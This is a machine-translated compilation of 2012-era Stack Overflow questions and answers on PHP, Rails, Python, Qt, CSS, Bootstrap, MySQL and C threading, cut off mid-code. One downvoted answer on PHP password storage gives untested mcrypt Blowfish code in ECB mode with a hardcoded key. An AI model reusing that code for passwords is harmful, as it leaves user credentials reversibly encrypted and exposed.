mtable123

Calls:
Model 1: NULL
Model 2: NULL
Model 3: NULL

=======================================
             Model 1  Model 2  Model 3 
---------------------------------------
(Intercept)  28.528*   6.497** 28.945**
             (7.535)  (1.225)  (7.602) 
pop15        -0.434**          -0.473**
             (0.149)           (0.150) 
pop75        -1.595            -1.655  
             (1.059)           (1.120) 
dpi                    0.001*  -0.000  
                      (0.001)  (0.001) 
ddpi                   0.462    0.385  
                      (0.206)  (0.203) 
---------------------------------------
sigma          3.739    4.383    3.523 
df            47.000   47.000   45.000 
stddev         3.998    4.098    3.931 
======================================= 
```**

# php - 格式化字符串到日期

> ID：13806773
> 
> 赞同：0
> 
> 时间：2012-12-10T18:17:53.593
> 
> 标签：php

我很难将字符串格式化为人类可读的日期格式。

我有：

> 07122012

并且需要得到

> 2012 年 12 月 7 日

试过：

```
date("j M Y", strtotime($str)); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:27:48.567

您可以像这样使用[DateTime::createFromFormat](http://php.net/manual/en/datetime.createfromformat.php)（适用于 PHP >= 5.3.0）：

```
$date = DateTime::createFromFormat('jmY', '07122012');
echo $date->format('d M Y') . "\n"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:27:57.640

尝试：

```
$str = "07122012";
$stryear = substr($str,-4);
$strmonth = substr($str,2,2);
$strday = substr($str,0,2);

echo date("j M Y", strtotime($stryear.'-'.$strmonth.'-'.$strday)); 
```

它会解决问题，但最好的办法是阅读 php 文档（可能有一个内置功能）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T19:01:57.777

我认为最优雅的方式是，因为你不能直接解析这个字符串，是这样的：

```
$date = "07122012";

// parse the dte fist correctly
$parsed_date = date_parse_from_format('dmY', $date);

// Make time, print date
echo date("j M Y", mktime(0, 0, 0, $parsed_date['month'], $parsed_date['day'], $parsed_date['year'])); 
```

# paperclip - 如何在 Active Admin 表单中调用 `f.action` 到自定义 :delete 回调

> ID：13806774
> 
> 赞同：2
> 
> 时间：2012-12-10T18:17:54.307
> 
> 标签：paperclip, activeadmin, formtastic

为了从我的对象中删除（回形针）图像，我定义了一个自定义回调（和路由）：

```
ActiveAdmin.register Camping do
  #...
  member_action :destroy_image, :method => :delete do
    camping = Camping.find(params[:id])
    camping.image.destroy
    redirect_to({:action => :show}, :notice => "Image deleted")
  end
end 
```

这按预期工作；通过命名路线`destroy_image_admin_camping => /admin/campings/:id/destroy_image`。

问题是我找不到如何将其添加到表单中：

```
ActiveAdmin.register Camping do
  form do |f|
    f.inputs "Camping" do
      f.input :name
      f.input :image
      f.action :delete_image, :url => destroy_image_admin_camping_path(@camping.id), :button_html => { :method => :delete }
      f.input :description
    end

    f.actions
  end
  #...
 end 
```

更详细：我不知道如何将“我们正在编辑的当前项目的id”传递给`destroy_image_admin_camping_path`；`@camping`是零，`f.camping`没有定义，所以我不知道如何在那里传递项目。

这是正确的方法吗？我更喜欢这个“ajax-ish”界面而不是更常见的复选框-删除-图像-更新，但我不确定这是否会起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-09T01:25:10.437

这里有几个问题，我会尽力解决所有问题。

**如何访问“我们正在编辑的当前项目的 ID”**

您非常接近寻找`f.camping`. 你想要的是`f.object`，所以：

`destroy_image_admin_camping_path(f.object.id)`.

注意：`f.object.id`当`nil`它是一个新表单（而不是编辑表单）时，您需要使用`unless f.object.new_record?`

**“这是正确的方法吗？”**

我不确定，真的。在我看来，在不实际保存当前呈现的表单的情况下发出请求可能会造成复杂性，但它可能会成为一个更好的界面。无论如何，如果你想做checkbox-that-deletes-images-on-update，这应该可以帮助你：[Rails Paperclip 如何删除附件？](https://stackoverflow.com/questions/4435826/rails-paperclip-how-to-delete-attachment).

但是，如果您想要 ajax-ish 方法，我认为您需要一个`<a>`样式为按钮的标签。实际使用按钮的问题是您不想提交表单。

这是一个例子：

```
f.inputs do
  link_to 'Delete Image', delete_image_admin_camping_path(f.object.id), class: 'button', remote: true, method: :delete
end 
```

`remote: true`将使它成为一个 ajax 请求，ActiveAdmin 为您提供了一个非常合理的`<a>`标签按钮类。根据成功/失败更新界面作为练习留给读者。

此外，您可能希望为此使用 erb 模板而不是 Active Admin DSL（请参阅底部的[http://activeadmin.info/docs/5-forms.html ）。](http://activeadmin.info/docs/5-forms.html)

像这样：

```
# app/views/admin/campings/_form.html.erb

<%= semantic_form_for [:admin, @post] do |f| %>
  <%= f.inputs do %>
    <%= f.input :name %>
    <%= f.input :image %>
    <%# Actually, you might want to check for presence of the image, I don't know Paperclip well enough to demonstrate that though %>
    <% unless f.object.new_record? %>
      <%= image_tag f.object.image_url %>
      <%= link_to 'Delete Image', delete_image_admin_camping_path(f.object.id), class: 'button', remote: true, method: :delete %>
    <% end %>

    ...

  <% end %>

  <%= f.actions %>
<% end %> 
```

# python - 多线变量分配速度和通量

> ID：13806777
> 
> 赞同：0
> 
> 时间：2012-12-10T18:18:00.610
> 
> 标签：python, performance, variables, python-2.7

因此，我正在使用 timeit 模块查看变量赋值的速度，我遇到了一些非常有趣的结果。我发现多行分配通常比单行分配更快。为什么是这样？

此外，值得注意的是，当放入`time.sleep(1)`下面的循环时，它似乎会***显着***影响速度结果。为什么是这样？

我的代码和结果如下：

***没有*****time.sleep**：

```
dis results for myfunc1:
  5           0 LOAD_CONST               2 ((10, 10))
              3 UNPACK_SEQUENCE          2
              6 STORE_FAST               0 (x)
              9 STORE_FAST               1 (y)
             12 LOAD_CONST               0 (None)
             15 RETURN_VALUE        
dis results for myfunc2:
  7           0 LOAD_CONST               1 (10)
              3 STORE_FAST               0 (x)

  8           6 LOAD_CONST               1 (10)
              9 STORE_FAST               1 (y)
             12 LOAD_CONST               0 (None)
             15 RETURN_VALUE        

Speed results for single line assignment:
4.61830006532e-06
4.10515561362e-06
4.10515561362e-06
4.61830006532e-06
4.61830006532e-06
4.10515561362e-06
4.10515561362e-06
4.10515561362e-06
4.10515561362e-06
4.10515561362e-06
4.10515561362e-06

Speed Results for multi-line assignment:
4.10515561362e-06
3.59201116192e-06
4.10515561362e-06
3.59201116192e-06
4.10515561362e-06
3.59201116192e-06
3.59201116192e-06
4.10515561362e-06
4.10515561362e-06
3.59201116192e-06
4.10515561362e-06 
```

***随着*****time.sleep**：

```
dis results for myfunc1:
  5           0 LOAD_CONST               2 ((10, 10))
              3 UNPACK_SEQUENCE          2
              6 STORE_FAST               0 (x)
              9 STORE_FAST               1 (y)
             12 LOAD_CONST               0 (None)
             15 RETURN_VALUE        
dis results for myfunc2:
  7           0 LOAD_CONST               1 (10)
              3 STORE_FAST               0 (x)

  8           6 LOAD_CONST               1 (10)
              9 STORE_FAST               1 (y)
             12 LOAD_CONST               0 (None)
             15 RETURN_VALUE        

Speed results for single line assignment:
4.61830006532e-06
5.13144451708e-06
9.03134234993e-05
0.000157022202221
8.77477012411e-05
4.61830006504e-06
4.7722434009e-05
1.59074780033e-05
0.000105707757051
0.000324307293475
1.43680446492e-05

Speed Results for multi-line assignment:
1.33417557446e-05
0.000202692058421
1.33417557446e-05
0.000163693080093
1.3854900196e-05
1.3854900196e-05
0.000279663726175
0.000142141013121
0.000202692058423
0.000200639480614
0.000103655179245 
```

**代码**：

```
import dis,timeit,time

#define the different methods of assignment
def myfunc1():
    x,y=10,10
def myfunc2():
    x=10
    y=10

#used simply for viewing how they are assigned
print "dis results for myfunc1:"
dis.dis(myfunc1)
print "dis results for myfunc2:"
dis.dis(myfunc2)

print "\n"

print "Speed results for single line assignment:"
#repeat 10 times, with looping 100 times per repeat to show speed and consistency
for x in range(11):
    print timeit.timeit(stmt="x,y=10,10",number=100)
    #time.sleep(1)
print "\n"

print "Speed Results for multi-line assignment:"
#repeat with the same method for previous test
for x in range(11):
    print timeit.timeit(stmt="x=10;y=10;",number=100)
    #time.sleep(1) 
```

基准：`Python 2.7.3 (default, Apr 10 2012, 23:31:26) [MSC v.1500 32 bit (Intel)] on win32`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:52:15.777

> 我发现多行分配通常比单行分配更快。为什么是这样？

因为`UNPACK_SEQUENCE`比`LOAD_CONST`.

> 此外，值得注意的是，将 time.sleep(1) 放在下面的循环中时，它似乎会显着影响速度结果。为什么是这样？

因为 100 次迭代对于快速操作来说太少了，并且受（低）时钟精度的影响很大。重新测试，`number=10000000`无论睡眠如何，您都会得到大致相同的结果。

# php - 究竟如何在 PHP 中使用河豚？

> ID：13806779
> 
> 赞同：9
> 
> 时间：2012-12-10T18:17:59.907
> 
> 标签：php, hash, passwords, blowfish, crypt

> **可能重复：**
> [使用 PHP 加密和解密密码的最佳方法？](https://stackoverflow.com/questions/1289061/best-way-to-use-php-to-encrypt-and-decrypt-passwords)

我最近一直在用 PHP 做很多事情，并想制作我的第一个登录/注册系统。因此，我一直在网上阅读大量资料，以找出执行此操作的最佳方法。我遇到了一些指南，在一些情况下我感到困惑，我想在开始这条路之前确定一下。

我的问题是我究竟如何使用河豚？我读过 crypt() 如果提供了适当的盐，它将自动选择河豚。如果是这样的话，是什么让咸河豚适合？

现在，我有一个脚本，可以根据日期和时间制作盐，一个随机数，然后将其散列为盐。那是我可以和河豚一起使用的东西吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-10T18:27:16.300

简而言之：不要自己构建它。使用图书馆。

在 PHP 5.5 中，将有一个新的 API 可让您更轻松地完成此过程。这是[它的 RFC](https://wiki.php.net/rfc/password_hash)。

我还在这里为它创建了一个向后兼容库：[password-compat](https://github.com/ircmaxell/password_compat)：

```
$hash = password_hash($password, PASSWORD_BCRYPT); 
```

然后验证：

```
if (password_verify($password, $hash)) {
    /* Valid */
} else {
    /* Invalid */
} 
```

如果您想要另一个库，请查看[phpass](http://www.openwall.com/phpass/)

简而言之，不要自己做。没有必要。只需导入库并完成它...

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-10T18:22:13.327

看看[http://php.net/manual/en/function.crypt.php](http://php.net/manual/en/function.crypt.php)

如果您向下滚动大约 1/3，您应该会看到标题：`Example #3 Using crypt() with different hash types`. 希望这会有所帮助！你的盐应该没问题！

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-12-10T21:06:37.047

试试这个 - 它未经测试，我只是把它搅起来展示如何使用 PHP 的 BLOWFISH 算法

```
<?php
class cipher {
private static $mode = 'MCRYPT_BLOWFISH';
private static $key = 'q!2wsd#45^532dfgTgf56njUhfrthu&^&ygsrwsRRsf';

public static function encrypt($buffer){
    $iv                 = mcrypt_create_iv(mcrypt_get_iv_size(constant(self::$mode), MCRYPT_MODE_ECB), MCRYPT_RAND); 
    $passcrypt  = mcrypt_encrypt(constant(self::$mode), self::$key, $buffer, MCRYPT_MODE_ECB, $iv); 
    $encode         = base64_encode($passcrypt); 
    return $encode; 
}

public static function decrypt($buffer){
    $decoded        = base64_decode($buffer); 
    $iv                 = mcrypt_create_iv(mcrypt_get_iv_size(constant(self::$mode), MCRYPT_MODE_ECB), MCRYPT_RAND); 
    $decrypted  = mcrypt_decrypt(constant(self::$mode), self::$key, $decoded, MCRYPT_MODE_ECB, $iv);
    return $decrypted;
}
}
?> 
```

重要的！！将 $key 值更改为另一个随机字符串！

用法：

加密：

$mystring = '一只敏捷的棕色狐狸跳过了懒惰的骆驼'; $mystring = cipher::encrypt($mystring);

解密：

$mystring = cipher::decrypt($myencryptedstring);

# qt - 未正确调用 QApplication 析构函数

> ID：13806786
> 
> 赞同：2
> 
> 时间：2012-12-10T18:18:23.593
> 
> 标签：qt, destructor

我从 QApplication 派生了一个应用程序类，以便重新实现一些方法。这是代码：

```
 class MyApplication : public QApplication
    {
        Q_OBJECT
    private:
    public:
        //...
        virtual ~MyApplication();   
    };

    MyApplication::~MyApplication()
    {
        qDebug("~MyApp1");
        try
        {
            //some potentially long operations
        }
        catch(...)
        {
            qDebug("~MyApp  Exception");
        }

        qDebug("~MyApp2");
    }

    int main(int argc, char *argv[])
    {
        int returnValue = 1;
        {
            MyApplication app(argc, argv);
            returnValue = app.exec();
        }
        return returnValue;
    } 
```

问题是我倾向于得到不同的 qDebug 输出。我总是打印 ~MyApp1，但有时只打印 ~MyApp2。可能是什么原因？看起来，当应用程序关闭时，Qt 并没有让整个析构函数完成。如何让程序等到析构函数完成？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:55:28.303

QApplication Destructor 被正确调用，只是 qDebug 可能不应该/不能在应用程序的如此晚的状态下使用。尝试直接使用 cout/cin 流 (iostreams/printf)。

# c - ISP 错误：“DDRD”未声明（在此函数中首次使用）

> ID：13806787
> 
> 赞同：2
> 
> 时间：2012-12-10T18:18:26.570
> 
> 标签：c, compiler-errors, terminal, arduino, compiler-warnings

我的 Arduino 作为 ISP 有一个问题：我已经按照 Michael Holachek 的教程观看了这段视频[http://michael.holachek.com/2012/09/avr-programming/](http://michael.holachek.com/2012/09/avr-programming/) ，当我在终端中写入时：“ `make flash`”它说了很多错误：

```
avr-gcc -Wall -Os -DF_CPU=8000000 -mmcu=attiny84 -c main.c -o main.o

main.c:1:1: warning: "F_CPU" redefined

<command line="">:1:1: warning: this is the location of the previous definition

main.c: In function 'main':

main.c:8: error: 'DDRD' undeclared (first use in this function)

main.c:8: error: (Each undeclared identifier is reported only once

main.c:8: error: for each function it appears in.)

main.c:12: error: 'PORTD' undeclared (first use in this function)

main.c:17:2: warning: no newline at end of file

make: *** [main.o] Error 1 
```

但是我已经包含了 avr/io，有人可以帮我吗？

# css - 所有输入的样式，除了具有特定类的输入

> ID：13806788
> 
> 赞同：0
> 
> 时间：2012-12-10T18:18:30.483
> 
> 标签：css, css-selectors

我为页面上所有类型文本的输入定义了 CSS 样式。我在我的部分页面上使用[光谱颜色](http://bgrins.github.com/spectrum/#toc5)选择器，这是在页面上实现的

```
<input type="text" class="basic" /> 
```

我正在尝试使用以下内容覆盖我已应用于所有文本类型输入的“全局”样式，但它不起作用：

```
input[type=text]:not([class=basic]), select {
    height:28px;
    border:1px solid #c5d1db;
    padding-left:5px;
    padding-right:5px;
    color:#627686;
    font-size:13px;
    box-shadow:inset 0 4px 5px 0 #ebebeb;
    margin:0;
} 
```

有没有办法覆盖这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:25:18.427

我真的看不到这里的问题，这不是 CSS 特异性的重点吗？ [http://jsfiddle.net/calder12/GBH8b/](http://jsfiddle.net/calder12/GBH8b/)

```
input[type=text]{
height:28px;
border:1px solid #c5d1db;
padding-left:5px;
padding-right:5px;
color:#627686;
font-size:13px;
box-shadow:inset 0 4px 5px 0 #ebebeb;
margin:0;
}

input[type=text].basic{
height:18px;
border:1px solid #000;
padding-left:5px;
padding-right:5px;
color:#627686;
font-size:13px;
margin:0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:34:32.180

发布的 CSS 代码在支持浏览器（一般包括现代浏览器，但不包括 IE 8 和更旧的浏览器）上工作，影响不在类中的字段。

显然，它不会影响类*中*的字段。但是用这个更受限制的规则替换适用于所有输入字段的现有规则会有所作为。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-10T18:20:42.210

只需声明`!important`，因为它将覆盖主要。

```
input[type=text]:not([class=basic]), select {
    height:28px !important;
    border:1px solid #c5d1db;
    padding-left:5px;
    padding-right:5px;
    color:#627686;
    font-size:13px;
    box-shadow:inset 0 4px 5px 0 #ebebeb;
    margin:0;
} 
```

# eclipse - Eclipse 插件扫描器和分区扫描器

> ID：13806790
> 
> 赞同：2
> 
> 时间：2012-12-10T18:18:34.743
> 
> 标签：eclipse, eclipse-plugin, eclipse-rcp

我正在为 Eclipse 制作自己的 powershell 编辑器插件。目前编辑器有一个很好的代码高亮。但是为了能够制作一个好的大纲视图和格式，我需要一个好的文档分区。所以我创建了分区扫描器（扩展 RuleBasedPartitionScanner），目前只有两条规则：

```
IToken psComment = new Token(PS_COMMENT);
IToken psFunction = new Token(PS_FUNCTION);

IPredicateRule[] rules = new IPredicateRule[2];

rules[0] = new EndOfLineRule("#", psComment);
rules[1] = new SingleLineRule("function", "{", psFunction);

setPredicateRules(rules); 
```

我已经使用 FastPartitioner 使用我的文档创建了它，其中包含所需的所有内容类型（IDocument.DEFAULT_CONTENT_TYPE、PowershellPartitionScanner.PS_FUNCTION、PowershellPartitionScanner.PS_COMMENT）

为了突出显示，我创建了一个扫描仪（扩展了 RuleBasedScanner）。

在配置类中，我重写了 getPresentrationReconciler：

```
DefaultDamagerRepairer dr = new DefaultDamagerRepairer(
                new PowershellScanner());
reconciler.setDamager(dr, PowershellPartitionScanner.PS_FUNCTION);
reconciler.setRepairer(dr, PowershellPartitionScanner.PS_FUNCTION);
dr = new DefaultDamagerRepairer(new PowershellScanner());
reconciler.setDamager(dr, PowershellPartitionScanner.PS_COMMENT);
reconciler.setRepairer(dr, PowershellPartitionScanner.PS_COMMENT);
dr = new DefaultDamagerRepairer(new PowershellScanner());
reconciler.setDamager(dr, IDocument.DEFAULT_CONTENT_TYPE);
reconciler.setRepairer(dr, IDocument.DEFAULT_CONTENT_TYPE);
return reconciler; 
```

我已经覆盖：

```
@Override
    public String[] getConfiguredContentTypes(ISourceViewer sourceViewer) {
        return new String[] { IDocument.DEFAULT_CONTENT_TYPE,
                PowershellPartitionScanner.PS_COMMENT,
                PowershellPartitionScanner.PS_FUNCTION };
    } 
```

我目前对我的文档进行了很好的分区。但是没有代码突出显示。一切都是黑色的。

如果我没有对文档进行分区，则突出显示有效。

我错过了什么吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T01:35:40.607

我认为错误在于为您要突出显示的内容定义重复的规则。看来您有在 PowershellPartitionScanner 中定义的规则也在 PowershellScanner 中定义。

不要使用 PowershellScanner 来突出显示这些分区规则，而是使用单独的扫描仪来实现此目的。

**1.**首先从 PowershellScanner 中删除已在 PowershellPartitionScanner 中定义的重复规则。

**2.**然后定义一个扫描器来突出显示分区（例如来自 Eclipse 示例“SampleJavaEditor”）

```
class SingleTokenScanner extends BufferedRuleBasedScanner {
    public SingleTokenScanner(TextAttribute attribute) {
        setDefaultReturnToken(new Token(attribute));
    }
} 
```

**3.**在您的配置类中修改 getPresentrationReconciler：

```
DefaultDamagerRepairer dr;

// General highlighting
dr = new DefaultDamagerRepairer(new PowershellScanner());
reconciler.setDamager(dr, IDocument.DEFAULT_CONTENT_TYPE);
reconciler.setRepairer(dr, IDocument.DEFAULT_CONTENT_TYPE);

// Function partition
dr = new DefaultDamagerRepairer(
    new SingleTokenScanner(
        new TextAttribute(colorManager.getColor(new RGB(255, 0, 0)))
    )
);
reconciler.setDamager(dr, PowershellPartitionScanner.PS_FUNCTION);
reconciler.setRepairer(dr, PowershellPartitionScanner.PS_FUNCTION);

// Comment partition
dr = new DefaultDamagerRepairer(
    new SingleTokenScanner(
        new TextAttribute(colorManager.getColor(new RGB(0, 255, 0)))
    )
);
reconciler.setDamager(dr, PowershellPartitionScanner.PS_COMMENT);
reconciler.setRepairer(dr, PowershellPartitionScanner.PS_COMMENT);

return reconciler; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T09:39:54.090

实际上，这解决了我的问题。在我的 FileDocumentProvider 扩展中添加了 IDocumentExtension3。通过使用它，我可以拥有两种类型的规则。

```
IDocument document = super.createDocument(element);
IDocumentExtension3 docExtension = (IDocumentExtension3) document;
if (document != null) {
    IDocumentPartitioner partitioner = new DebugPartitioner(Activator
            .getDefault().getPowershellPartitionScanner(),
            new String[] { IDocument.DEFAULT_CONTENT_TYPE,
                    PowershellPartitionScanner.PS_FUNCTION,
                    PowershellPartitionScanner.PS_COMMENT });
    partitioner.connect(document);
    docExtension.setDocumentPartitioner(
            Activator.POWERSHELL_PARTITIONING, partitioner);
}
return document; 
```

解决方案在 PyDev eclipse 插件中找到。

# mysql - 按字母顺序排列数据库中表的字段

> ID：13806791
> 
> 赞同：0
> 
> 时间：2012-12-10T18:18:39.273
> 
> 标签：mysql, field

我有一个数据库“门户”和表“员工”以及该表中的 60 多个字段，这些字段未按字母顺序排列。我想从 phpmyadmin 或通过任何其他方式按升序排列字段名称。

我尝试 [了 MySQL 按列名排序表](https://stackoverflow.com/questions/8210142/mysql-sorting-table-by-column-names)

```
SELECT column_name
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_schema = '[portal]'
AND table_name = '[employee]'
ORDER BY column_name 
```

...但它不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:25:51.677

您应该能够使用以下内容：

```
SELECT column_name
FROM INFORMATION_SCHEMA.COLUMNS
WHERE  table_schema = 'portal'
   AND table_name = 'employee'
ORDER BY column_name 
```

# wordpress - 如果 url 是，则在图像上创建一个活动

> ID：13806797
> 
> 赞同：1
> 
> 时间：2012-12-10T18:19:00.630
> 
> 标签：wordpress, image, hover

我正忙于一个 Wordpress 网站。在这个网站上有一些带有悬停的图像。当悬停处于活动状态时，它将从黑色/白色变为彩色图像。

现在，正如您在网站上看到的那样，您可以在右上角看到图像。当您将鼠标悬停时，颜色会发生变化。但是当您在页面[http://www.freshymedia.nl/inge/site/](http://www.freshymedia.nl/inge/site/)上时，第一张图片需要着色。

例如，当您在此页面上时：[http](http://www.freshymedia.nl/inge/site/contact/) ://www.freshymedia.nl/inge/site/contact/ 最后一张图片需要着色，其余的只需要在您想要悬停时悬停。

有人对我有解决方案吗？该网站已在 Wordpress 中构建。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T09:13:45.990

我测试当前页面的方法是使用该代码的functions.php：

```
 $host = $_SERVER['REQUEST_URI']; //finding out the url

    $contactimg = 'http://LINK TO YOUR B&W IMAGE.jpg'; //B&W image link - the normal image

    if ($host == '/contact/') //if url is contact
    {
     $contactimg = 'http://LINK TO YOUR COLOUR IMAGE.jpg'; //Current page image
    } 
```

然后在您的图像所在的代码中，您将拥有：

```
 <a href="/contact"><img src="<?php echo $contactimg ;?>" /></a> 
```

希望这是有道理的......

还要检查要输入的网址而不是“联系人”，您可以在页面上回显主机

```
 <?php echo $host;?> 
```

这将显示您当前所在页面的网址。

# html - Twitter bootstrap 下拉菜单出现在屏幕之外

> ID：13806802
> 
> 赞同：160
> 
> 时间：2012-12-10T18:19:14.160
> 
> 标签：html, css, twitter-bootstrap

我想实现 twitter 引导下拉菜单，这是我的代码：

```
<span class="dropdown"> 
<a href="#menu1" class="dropdown-toggle" data-toggle="dropdown" ><img class="left" src="/static/img/topmenu_preferences.png" /><b class="caret"></b></a>
<ul class="dropdown-menu">
  <li><a href="#">a</a></li>
  <li><a href="#">b</a></li>
  <li><a href="#">c</a></li>
  <li class="divider"></li>
  <li><a href="#">d</a></li>
</ul> 
```

下拉菜单效果很好，我的下拉菜单位于屏幕右边缘旁边，当我单击下拉切换时，列表会出现在屏幕之外。它看起来像在屏幕上：

![在此处输入图像描述](../Images/48c1e7f43a028ceb28b0fb419befdac9.png)

我该如何解决？

* * *

## 回答 #1

> 赞同：278
> 
> 时间：2012-12-10T18:58:38.137

添加`.pull-right`到`ul.dropdown-menu`应该这样做

> **弃用通知：**从 Bootstrap v3.1.0 开始，`.pull-right`下拉菜单中的[deprecated](http://getbootstrap.com/components/#dropdowns-alignment)。要右对齐菜单，请使用`.dropdown-menu-right`.

* * *

## 回答 #2

> 赞同：117
> 
> 时间：2014-05-21T05:23:50.303

由于 Bootstrap v3.1.0`.pull-right`不推荐在下拉菜单中添加。`.dropdown-menu-right`应`ul.dropdown-menu`改为添加A。[文档](http://getbootstrap.com/components/#dropdowns-alignment)

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2018-03-09T21:03:47.857

对于 Bootstrap 4，添加`dropdown-menu-right`作品。这是一个工作示例..

[http://codeply.com/go/w2MJngNkDQ](http://codeply.com/go/w2MJngNkDQ)

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2017-03-23T13:35:31.697

一个不需要修改 HTML 只有 CSS 的解决方案

```
li.dropdown:last-child .dropdown-menu {
  right: 0;
  left: auto;
} 
```

它对于动态生成的菜单特别有用，其中并不总是可以将推荐的类添加`dropdown-menu-right`到最后一个元素

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2015-07-22T06:40:54.707

### 您可以将类`.dropdown-pull-right`与以下 css 一起使用：

```
.dropdown-pull-right {
  float: right !important;
  right: 0;
  left: auto;
}

.dropdown-pull-right>.dropdown-menu {
  right: 0;
  left: auto;
}
```

```
<link href="https://maxcdn.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet"/>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js"></script>

<div class="dropdown dropdown-pull-right btn-group">
  <a class="btn dropdown-toggle" data-toggle="dropdown" href="#">
  Open Dropdown
  <span class="caret"></span>
  </a>
  <ul class="dropdown-menu">
    <li>Item 1</li>
    <li>Item 2</li>
    <li>Item 3</li>
  </ul>
</div>
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2019-05-13T02:23:32.247

在 Bootstrap 4 中，您可以使用 .dropleft

只需更改为：

`<span class="dropleft">`

或者

添加 .dropdown-menu-{lg,med,sm,xs}-right 到您的下拉菜单

```
<div class="dropdown-menu dropdown-menu-sm-right" aria-labelledby="dropdown03">
    <a class="dropdown-item" href="#">Action</a>
    <a class="dropdown-item" href="#">Another action</a>
    <a class="dropdown-item" href="#">Something else here</a>
</div> 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-12-23T08:25:26.890

`float-*-right`对于引导程序 4

`*`= xs, sm, md, lg

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-05-14T19:39:16.827

我无法发表评论，因为我的 SO 级别太低，但我只是确保将父容器设置为“溢出：隐藏”（同时确保设置位置）。

```
<div style="overflow:hidden;position:relative">
    <span class="dropdown"> 
    <a href="#menu1" class="dropdown-toggle" data-toggle="dropdown" ><img class="left" src="/static/img/topmenu_preferences.png" /><b class="caret"></b></a>
    <ul class="dropdown-menu">
      <li><a href="#">a</a></li>
      <li><a href="#">b</a></li>
      <li><a href="#">c</a></li>
      <li class="divider"></li>
      <li><a href="#">d</a></li>
    </ul>
</div> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-04-15T20:29:55.363

如果您使用的是 Bootstrap 5，根据文档：

> Dropright：通过将 .dropend 添加到父元素来触发元素右侧的下拉菜单。

```
<div class="btn-group dropend">
 <button type="button" class="btn btn-secondary dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
  Dropright
 </button>
 <ul class="dropdown-menu">
  <!-- Dropdown menu links -->
 </ul>
</div> 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-07-28T10:17:11.037

我最近遇到了这个问题，我通过将 display="dynamic" 添加到我的 ngbDropdown 来解决它（使用 Angular 12、ngBootstrap 10 和 Bootstrap 4）：

```
<div class="row">
  <div class="col">
    <div ngbDropdown display="dynamic" class="d-inline-block dropdown-menu-right">
      <button class="btn btn-outline-primary" id="navbarDropdownForm" ngbDropdownToggle>Sign in</button>
      <div ngbDropdownMenu aria-labelledby="navbarDropdownForm">
        <form class="px-4 py-3">
          <div class="form-group">
            <label for="navbarDropdownFormEmail">Email address</label>
            <input type="email" class="form-control" id="navbarDropdownFormEmail" placeholder="email@example.com"
              autocomplete="username">
          </div>
          <div class="form-group">
            <label for="navbarDropdownFormPassword">Password</label>
            <input type="password" class="form-control" id="navbarDropdownFormPassword" placeholder="Password"
              autocomplete="current-password">
          </div>
          <div class="form-check">
            <input type="checkbox" class="form-check-input" id="dropdownCheck">
            <label class="form-check-label" for="dropdownCheck">
              Remember me
            </label>
          </div>
          <button type="submit" class="btn btn-primary">Sign in</button>
        </form>
        <div class="dropdown-divider"></div>
        <button ngbDropdownItem>New around here? Sign up</button>
        <button ngbDropdownItem>Forgot password?</button>
      </div>
    </div>
  </div>
</div>
```

# c - 跨多个文件的线程

> ID：13806803
> 
> 赞同：1
> 
> 时间：2012-12-10T18:19:19.730
> 
> 标签：c, multithreading

我的程序正在读取文件并使用线程来计算最高质数，当我将打印语句放入 getNum() 函数时，我的数字正在打印出来。但是，无论我输入多少线程，它似乎都只是滞后。每个文件中有 100 万个整数。有人看到我的代码明显有问题吗？基本上，代码是在分配新线程之前给每个线程 1000 个整数进行检查。我仍然是一个 C 菜鸟，并且正在学习穿线的技巧。我的代码现在一团糟，因为我一直在不断地切换东西。

```
#include <stdio.h>  
#include <stdlib.h> 
#include <time.h>   
#include <string.h>
#include <pthread.h> 
#include <math.h>
#include <semaphore.h>

//Global variable declaration
char *file1 = "primes1.txt";
char *file2 = "primes2.txt";
char *file3 = "primes3.txt";
char *file4 = "primes4.txt";
char *file5 = "primes5.txt";
char *file6 = "primes6.txt";
char *file7 = "primes7.txt";
char *file8 = "primes8.txt";
char *file9 = "primes9.txt";
char *file10 = "primes10.txt";

char **fn; //file name variable

int numberOfThreads;
int *highestPrime = NULL;
int fileArrayNum = 0;
int loop = 0;

int currentFile = 0;

sem_t semAccess;
sem_t semAssign;

int prime(int n)//check for prime number, return 1 for prime 0 for nonprime
{
  int i;
  for(i = 2; i <= sqrt(n); i++)
    if(n % i == 0)
      return(0);

    return(1);
}

int getNum(FILE* file)
{
  int number;
  char* tempS = malloc(20 *sizeof(char));
  fgets(tempS, 20, file);
  tempS[strlen(tempS)-1] = '\0';
  number = atoi(tempS);

  free(tempS);//free memory for later call

  return(number);
}

void* findPrimality(void *threadnum) //main thread function to find primes
{
  int tNum = (int)threadnum;
  int checkNum;
  char *inUseFile = NULL;
  int x=1;

  FILE* file;
